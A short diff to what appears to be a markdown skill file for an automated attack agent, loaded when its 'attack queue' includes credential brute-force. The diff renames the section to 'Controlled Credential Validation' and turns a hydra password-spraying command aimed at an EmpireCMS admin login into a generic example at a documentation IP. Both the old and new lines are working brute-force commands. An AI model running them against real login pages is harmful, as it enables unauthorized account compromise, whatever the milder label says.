@@ -1,4 +1,4 @@
-# Brute Force — Password & Credential Attacks
+# Controlled Credential Validation
 
 > Load this file when the attack queue includes authentication bypass or credential brute-force.
 
@@ -49,11 +49,11 @@ hydra -l <username> -P <wordlist> <host> http-post-form \
   -t 4 -w 2
 ```
 
-Example for EmpireCMS admin login:
+Example for an authorized test admin login:
 ```bash
-hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
-  192.168.20.21 http-post-form \
-  "/e/admin/ecmsadmin.php:enews=login&username=^USER^&password=^PASS^&empirecmskey1=:incorrect" \
+hydra -l <authorized_test_user> -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+  192.0.2.21 http-post-form \
+  "/admin/login:username=^USER^&password=^PASS^:incorrect" \
   -t 4
 ```
 
